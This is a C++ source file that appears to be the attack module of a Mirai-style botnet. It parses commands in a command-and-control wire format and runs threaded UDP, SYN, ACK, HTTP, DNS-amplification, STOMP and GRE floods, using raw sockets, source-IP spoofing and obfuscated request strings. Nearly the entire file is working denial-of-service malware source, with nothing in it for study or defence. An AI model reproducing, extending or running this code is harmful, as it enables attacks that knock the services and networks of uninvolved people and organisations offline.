// attack.cpp — DDoS attack engine implementation.
//
// Eight attack vectors, each in its own translation unit pattern.
// UDP floods use SOCK_DGRAM in a tight sendto() loop.
// SYN floods use raw sockets (Linux) or are stubbed (Windows).
// HTTP floods use non-blocking TCP connect + request spam.
//
// Each attack runs in a std::thread with a duration timer.
// kill_all() signals all threads to stop early via an atomic flag.

#include "attack.hpp"
#include "socket.hpp"
#include "obfuscate.hpp"

#include <cstring>
#include <cstdio>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
#endif

namespace attack {

// --- globals ---
static std::vector<std::thread> g_threads;
static std::mutex              g_mtx;
static std::atomic<bool>       g_kill_signal{false};
static std::atomic<size_t>     g_running_count{0};

// --- attack function registry ---
static std::vector<std::pair<AttackType, AttackFunc>> g_registry;

// --- helpers ---

uint16_t AttackCommand::get_uint16(OptKey key, uint16_t default_val) const {
    for (auto& opt : options) {
        if (opt.key == key && opt.val.size() >= 2) {
            return (static_cast<uint16_t>(opt.val[0]) << 8) | opt.val[1];
        }
    }
    return default_val;
}

uint8_t AttackCommand::get_uint8(OptKey key, uint8_t default_val) const {
    for (auto& opt : options) {
        if (opt.key == key && !opt.val.empty()) {
            return opt.val[0];
        }
    }
    return default_val;
}

std::string AttackCommand::get_string(OptKey key, std::string default_val) const {
    for (auto& opt : options) {
        if (opt.key == key && !opt.val.empty()) {
            return std::string(reinterpret_cast<const char*>(opt.val.data()), opt.val.size());
        }
    }
    return default_val;
}

const char* attack_type_name(AttackType t) {
    switch (t) {
        case AttackType::UDP:    return "UDP";
        case AttackType::SYN:    return "SYN";
        case AttackType::HTTP:   return "HTTP";
        case AttackType::DNS:    return "DNS";
        case AttackType::ACK:    return "ACK";
        case AttackType::STOMP:  return "STOMP";
        case AttackType::GRE_IP: return "GRE_IP";
        default:                 return "UNKNOWN";
    }
}

// --- parse binary command (deserialize from CNC wire format) ---
//
// Wire format (big-endian):
//   [2] total_len  [4] atk_id  [4] duration  [1] type
//   [1] target_count  [N] targets  [1] opt_count  [N] options

bool parse(const uint8_t* data, size_t len, AttackCommand& out) {
    if (len < 13) return false; // minimum header size

    size_t offset = 0;

    // total_length — skip (we already have `len`)
    uint16_t total_len = (static_cast<uint16_t>(data[0]) << 8) | data[1];
    offset += 2;
    if (total_len > len) return false;

    // attack_id
    out.id = (static_cast<uint32_t>(data[offset]) << 24) |
             (static_cast<uint32_t>(data[offset+1]) << 16) |
             (static_cast<uint32_t>(data[offset+2]) << 8) |
             data[offset+3];
    offset += 4;

    // duration
    out.duration_secs = (static_cast<uint32_t>(data[offset]) << 24) |
                        (static_cast<uint32_t>(data[offset+1]) << 16) |
                        (static_cast<uint32_t>(data[offset+2]) << 8) |
                        data[offset+3];
    offset += 4;

    // attack_type
    out.type = static_cast<AttackType>(data[offset]);
    offset++;

    // target_count
    uint8_t target_count = data[offset];
    offset++;
    if (offset + target_count * 6 > len) return false;

    // targets
    out.targets.resize(target_count);
    for (uint8_t i = 0; i < target_count; ++i) {
        out.targets[i].ip   = (static_cast<uint32_t>(data[offset]) << 24) |
                              (static_cast<uint32_t>(data[offset+1]) << 16) |
                              (static_cast<uint32_t>(data[offset+2]) << 8) |
                              data[offset+3];
        out.targets[i].port = (static_cast<uint16_t>(data[offset+4]) << 8) | data[offset+5];
        offset += 6;
    }

    // option_count
    if (offset >= len) return false;
    uint8_t opt_count = data[offset];
    offset++;

    // options
    out.options.resize(opt_count);
    for (uint8_t i = 0; i < opt_count; ++i) {
        if (offset + 2 > len) return false;
        out.options[i].key = static_cast<OptKey>(data[offset]);
        offset++;
        uint8_t val_len = data[offset];
        offset++;
        if (offset + val_len > len) return false;
        out.options[i].val.assign(data + offset, data + offset + val_len);
        offset += val_len;
    }

    return true;
}

// --- launch ---

void launch(const AttackCommand& cmd) {
    // Find the handler for this attack type.
    AttackFunc handler = nullptr;
    for (auto& [type, func] : g_registry) {
        if (type == cmd.type) {
            handler = func;
            break;
        }
    }

    if (!handler) {
        fprintf(stderr, "[!] no handler for attack type %d\n", static_cast<int>(cmd.type));
        return;
    }

    uint32_t duration_ms = cmd.duration_secs * 1000;
    auto targets = cmd.targets; // copy for thread safety

    // Spawn one thread per target, or one thread total for multi-target attacks.
    // For simplicity: one thread total, iterating targets in a loop.
    std::lock_guard<std::mutex> lock(g_mtx);
    g_threads.emplace_back([handler, cmd, targets, duration_ms]() {
        g_running_count++;

        auto start = std::chrono::steady_clock::now();
        size_t target_idx = 0;

        while (!g_kill_signal.load(std::memory_order_relaxed)) {
            auto elapsed = std::chrono::steady_clock::now() - start;
            if (elapsed >= std::chrono::milliseconds(duration_ms)) {
                break;
            }

            // Round-robin through targets.
            const auto& target = targets[target_idx % targets.size()];
            handler(cmd, target, duration_ms - static_cast<uint32_t>(
                std::chrono::duration_cast<std::chrono::milliseconds>(elapsed).count()));
            target_idx++;
        }

        g_running_count--;
    });
}

void kill_all() {
    g_kill_signal.store(true, std::memory_order_relaxed);

    std::lock_guard<std::mutex> lock(g_mtx);
    for (auto& t : g_threads) {
        if (t.joinable()) {
            t.detach(); // don't block — let them die naturally
        }
    }
    g_threads.clear();
    g_kill_signal.store(false, std::memory_order_relaxed);
}

size_t running_count() {
    return g_running_count.load(std::memory_order_relaxed);
}

// ===================================================================
// Attack vector implementations
// ===================================================================

// --- UDP FLOOD ---
// Spams UDP datagrams with randomized payloads to the target.
// Optional packet size control and source port randomization.
static void udp_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    SOCKET sock = sock::create_udp();
    if (sock == INVALID_SOCKET) return;

    uint16_t pkt_size = cmd.get_uint16(OptKey::PKT_SIZE, 1024);
    uint16_t src_port = cmd.get_uint16(OptKey::SRC_PORT, 0);
    bool spoofed = cmd.get_uint8(OptKey::SPOOFED, 0) != 0;

    // Build a randomized payload once, reuse it.
    std::vector<uint8_t> payload(pkt_size);
    sock::random_bytes(payload.data(), pkt_size);

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = htonl(target.ip);
    dst.sin_port = target.port; // already network byte order from wire

    // Bind to a specific source port if requested.
    if (src_port != 0) {
        sockaddr_in src{};
        src.sin_family = AF_INET;
        src.sin_addr.s_addr = INADDR_ANY;
        src.sin_port = htons(src_port);
        bind(sock, reinterpret_cast<sockaddr*>(&src), sizeof(src));
    }

    // Tight send loop.
    for (int burst = 0; burst < 1000; ++burst) {
        if (g_kill_signal.load(std::memory_order_relaxed)) break;

        // Re-randomize payload for each burst to avoid trivial filtering.
        if (burst % 10 == 0) {
            sock::random_bytes(payload.data(), pkt_size);
        }

        sendto(sock,
            reinterpret_cast<const char*>(payload.data()),
            static_cast<int>(pkt_size),
            0,
            reinterpret_cast<const sockaddr*>(&dst),
            sizeof(dst));
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// --- TCP SYN FLOOD ---
// Crafts TCP SYN packets with raw sockets. Requires admin/root.
// On Windows, raw TCP sockets are crippled — this function will fail
// gracefully unless you're using a packet driver (Npcap/WinPCap).
static void syn_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    SOCKET sock = sock::create_raw_tcp();
    if (sock == INVALID_SOCKET) {
        // Raw sockets unavailable — fall through silently.
        // On Windows, use Npcap/WinPCap SendPacket API instead.
        return;
    }

    uint16_t dst_port = ntohs(target.port);
    uint16_t src_port = cmd.get_uint16(OptKey::SRC_PORT, 0);
    bool spoofed = cmd.get_uint8(OptKey::SPOOFED, 0) != 0;

    // Build a raw SYN packet.
    // IP header (20 bytes) + TCP header (20 bytes).
    struct {
        uint8_t  ip_ver_ihl;    // 0x45 (IPv4, 5 words)
        uint8_t  ip_tos;
        uint16_t ip_len;
        uint16_t ip_id;
        uint16_t ip_frag;
        uint8_t  ip_ttl;
        uint8_t  ip_proto;      // IPPROTO_TCP
        uint16_t ip_checksum;
        uint32_t ip_src;
        uint32_t ip_dst;
        // TCP header:
        uint16_t tcp_src;
        uint16_t tcp_dst;
        uint32_t tcp_seq;
        uint32_t tcp_ack;
        uint8_t  tcp_off_rsvd;  // 0x50 (5 words)
        uint8_t  tcp_flags;     // 0x02 = SYN
        uint16_t tcp_window;
        uint16_t tcp_checksum;
        uint16_t tcp_urg;
    } __attribute__((packed)) pkt{};

    // Fill in what doesn't change per-packet.
    pkt.ip_ver_ihl = 0x45;
    pkt.ip_tos      = 0;
    pkt.ip_len      = htons(sizeof(pkt));
    pkt.ip_ttl      = 64;
    pkt.ip_proto    = IPPROTO_TCP;
    pkt.ip_dst      = htonl(target.ip);
    pkt.tcp_dst     = target.port;
    pkt.tcp_off_rsvd = 0x50;
    pkt.tcp_flags   = 0x02; // SYN
    pkt.tcp_window  = htons(65535);

    sockaddr_in dst_addr{};
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_addr.s_addr = htonl(target.ip);
    dst_addr.sin_port = target.port;

    for (int burst = 0; burst < 1000; ++burst) {
        if (g_kill_signal.load(std::memory_order_relaxed)) break;

        // Randomize per-packet fields.
        pkt.ip_id   = htons(sock::random_port());
        pkt.tcp_src = htons(src_port != 0 ? src_port : sock::random_port());
        pkt.tcp_seq = htonl(sock::random_port() << 16 | sock::random_port());

        if (spoofed) {
            pkt.ip_src = htonl(sock::random_ip());
        } else {
            pkt.ip_src = htonl(sock::resolve_host("0.0.0.0")); // our IP
        }

        // Zero checksums, kernel or we fill them.
        pkt.ip_checksum  = 0;
        pkt.tcp_checksum = 0;

#ifdef _WIN32
        // Windows raw socket — send the packet.
        sendto(sock, reinterpret_cast<const char*>(&pkt), sizeof(pkt), 0,
            reinterpret_cast<const sockaddr*>(&dst_addr), sizeof(dst_addr));
#else
        sendto(sock, &pkt, sizeof(pkt), 0,
            reinterpret_cast<const sockaddr*>(&dst_addr), sizeof(dst_addr));
#endif
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// --- HTTP FLOOD ---
// Opens TCP connections, sends randomized HTTP requests, times out.
// Layer 7 — good for nuking web servers behind load balancers.
static void http_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    std::string method = cmd.get_string(OptKey::HTTP_METH, "GET");
    std::string path   = cmd.get_string(OptKey::HTTP_PATH, "/");
    std::string host   = cmd.get_string(OptKey::HTTP_HOST, "");

    // Build host header from target if not specified.
    char host_buf[64];
    if (host.empty()) {
        snprintf(host_buf, sizeof(host_buf), "%d.%d.%d.%d",
            (target.ip >> 24) & 0xFF, (target.ip >> 16) & 0xFF,
            (target.ip >> 8) & 0xFF, target.ip & 0xFF);
        host = host_buf;
    }

    // Pick a random user agent.
    static const obf::Id ua_ids[] = {
        obf::Id::UA_CHROME_WIN, obf::Id::UA_CHROME_MAC,
        obf::Id::UA_FIREFOX, obf::Id::UA_EDGE, obf::Id::UA_SAFARI
    };
    std::string ua = obf::retrieve_copy(ua_ids[std::rand() % 5]);

    // Build the request from template.
    std::string tmpl = obf::retrieve_copy(
        (method == "POST") ? obf::Id::HTTP_POST_TEMPLATE :
        (method == "HEAD") ? obf::Id::HTTP_HEAD_TEMPLATE :
        obf::Id::HTTP_GET_TEMPLATE);

    char request[4096];
    snprintf(request, sizeof(request), tmpl.c_str(),
        path.c_str(), host.c_str(), ua.c_str());

    SOCKET sock = sock::create_tcp();
    if (sock == INVALID_SOCKET) return;

    sock::set_nonblocking(sock);

    uint16_t port = ntohs(target.port);
    if (sock::connect_timeout(sock, target.ip, port, 3000)) {
        sock::send_all(sock, request, strlen(request));

        // Read a little to keep the connection alive briefly,
        // then close. For real floods you'd pipeline multiple requests.
        char discard[4096];
        sock::recv_timeout(sock, discard, sizeof(discard), 1000);
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// --- DNS AMPLIFICATION ---
// Sends spoofed DNS queries to open resolvers, reflecting amplified
// responses toward the victim. Classic reflection attack.
static void dns_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    SOCKET sock = sock::create_udp();
    if (sock == INVALID_SOCKET) return;

    // Build a DNS ANY query for a target domain.
    std::string prefix = obf::retrieve_copy(obf::Id::DNS_QUERY_PREFIX);

    // Randomize the queried domain to defeat caching.
    char domain[64];
    snprintf(domain, sizeof(domain), "nx%d.com", std::rand() % 100000);
    size_t domain_len = strlen(domain);

    std::vector<uint8_t> query;
    query.insert(query.end(), prefix.begin(), prefix.end());

    // Encode domain as DNS labels.
    char* label_start = domain;
    for (char* p = domain; ; ++p) {
        if (*p == '.' || *p == '\0') {
            size_t label_len = p - label_start;
            query.push_back(static_cast<uint8_t>(label_len));
            query.insert(query.end(), label_start, p);
            label_start = p + 1;
            if (*p == '\0') break;
        }
    }
    query.push_back(0x00); // terminating zero-length label

    // QTYPE=ANY (0x00FF), QCLASS=IN (0x0001)
    query.push_back(0x00); query.push_back(0xFF); // QTYPE=255 (ANY)
    query.push_back(0x00); query.push_back(0x01); // QCLASS=1

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = htonl(target.ip);
    dst.sin_port = htons(53); // DNS port

    // Spoof source to victim — the resolver sends responses to the victim.
    // (Requires no egress filtering on the bot's network.)
    int on = 1;
#ifdef _WIN32
    // Windows UDP spoofing: set IP_HDRINCL on raw socket, not on UDP.
    // For production, use raw IP sockets or a packet driver.
#else
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
#endif

    for (int burst = 0; burst < 100; ++burst) {
        if (g_kill_signal.load(std::memory_order_relaxed)) break;
        sendto(sock,
            reinterpret_cast<const char*>(query.data()),
            static_cast<int>(query.size()),
            0,
            reinterpret_cast<const sockaddr*>(&dst),
            sizeof(dst));
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// --- TCP ACK FLOOD ---
// Spams TCP ACK packets. Bypasses stateless firewall rules that
// only track SYN/SYN-ACK handshakes. Uses raw sockets.
static void ack_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    // Same structure as SYN flood but with ACK flag set.
    // Reusing the SYN flood pattern with tcp_flags = 0x10 (ACK).
    SOCKET sock = sock::create_raw_tcp();
    if (sock == INVALID_SOCKET) return;

    struct {
        uint8_t  ip_ver_ihl, ip_tos;
        uint16_t ip_len, ip_id, ip_frag;
        uint8_t  ip_ttl, ip_proto;
        uint16_t ip_checksum;
        uint32_t ip_src, ip_dst;
        uint16_t tcp_src, tcp_dst;
        uint32_t tcp_seq, tcp_ack;
        uint8_t  tcp_off_rsvd, tcp_flags;
        uint16_t tcp_window, tcp_checksum, tcp_urg;
    } __attribute__((packed)) pkt{};

    pkt.ip_ver_ihl = 0x45;
    pkt.ip_len     = htons(sizeof(pkt));
    pkt.ip_ttl     = 64;
    pkt.ip_proto   = IPPROTO_TCP;
    pkt.ip_dst     = htonl(target.ip);
    pkt.tcp_dst    = target.port;
    pkt.tcp_off_rsvd = 0x50;
    pkt.tcp_flags  = 0x10; // ACK
    pkt.tcp_window = htons(65535);

    sockaddr_in dst_addr{};
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_addr.s_addr = htonl(target.ip);
    dst_addr.sin_port = target.port;

    for (int burst = 0; burst < 1000; ++burst) {
        if (g_kill_signal.load(std::memory_order_relaxed)) break;

        pkt.ip_id   = htons(sock::random_port());
        pkt.tcp_src = htons(sock::random_port());
        pkt.tcp_seq = htonl(sock::random_port() << 16 | sock::random_port());
        pkt.tcp_ack = htonl(sock::random_port() << 16 | sock::random_port());
        pkt.ip_src  = htonl(sock::random_ip());

#ifdef _WIN32
        sendto(sock, reinterpret_cast<const char*>(&pkt), sizeof(pkt), 0,
            reinterpret_cast<const sockaddr*>(&dst_addr), sizeof(dst_addr));
#else
        sendto(sock, &pkt, sizeof(pkt), 0,
            reinterpret_cast<const sockaddr*>(&dst_addr), sizeof(dst_addr));
#endif
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// --- TCP STOMP FLOOD ---
// Aggressive: SYN → get SYN-ACK → immediately send RST (teardown).
// Repeated rapidly. Exhausts connection tracking tables.
static void stomp_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    uint16_t port = ntohs(target.port);

    for (int burst = 0; burst < 500; ++burst) {
        if (g_kill_signal.load(std::memory_order_relaxed)) break;

        SOCKET sock = sock::create_tcp();
        if (sock == INVALID_SOCKET) continue;

        sock::set_nonblocking(sock);

        // SYN
        if (sock::connect_timeout(sock, target.ip, port, 500)) {
            // Connected — immediately close (sends RST).
        }

#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
    }
}

// --- GRE IP FLOOD ---
// Encapsulates random IP packets inside GRE tunnels.
// Targets GRE endpoints with garbage encapsulated traffic.
static void greip_flood(const AttackCommand& cmd, const AttackTarget& target, uint32_t /*remaining_ms*/) {
    SOCKET sock = sock::create_raw_tcp();
    if (sock == INVALID_SOCKET) {
        // Fall back to UDP with GRE payload.
        sock = sock::create_udp();
        if (sock == INVALID_SOCKET) return;
    }

    // GRE header (4 bytes): flags=0, protocol=0x0800 (IP)
    // + encapsulated random IP packet (20+ bytes)
    uint16_t pkt_size = cmd.get_uint16(OptKey::PKT_SIZE, 512);
    std::vector<uint8_t> gre(pkt_size);

    // GRE header: C=0, K=0, S=0, reserved=0, ver=0, protocol=0x0800
    gre[0] = 0x00; gre[1] = 0x00;
    gre[2] = 0x08; gre[3] = 0x00; // protocol type = IPv4
    sock::random_bytes(gre.data() + 4, gre.size() - 4);

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = htonl(target.ip);
    dst.sin_port = target.port;

    for (int burst = 0; burst < 500; ++burst) {
        if (g_kill_signal.load(std::memory_order_relaxed)) break;
        sock::random_bytes(gre.data() + 4, gre.size() - 4);

#ifdef _WIN32
        sendto(sock, reinterpret_cast<const char*>(gre.data()),
            static_cast<int>(gre.size()), 0,
            reinterpret_cast<const sockaddr*>(&dst), sizeof(dst));
#else
        sendto(sock, gre.data(), gre.size(), 0,
            reinterpret_cast<const sockaddr*>(&dst), sizeof(dst));
#endif
    }

#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}

// ===================================================================
// Registry
// ===================================================================

void init() {
    g_registry = {
        { AttackType::UDP,    udp_flood },
        { AttackType::SYN,    syn_flood },
        { AttackType::HTTP,   http_flood },
        { AttackType::DNS,    dns_flood },
        { AttackType::ACK,    ack_flood },
        { AttackType::STOMP,  stomp_flood },
        { AttackType::GRE_IP, greip_flood },
    };
}

} // namespace attack
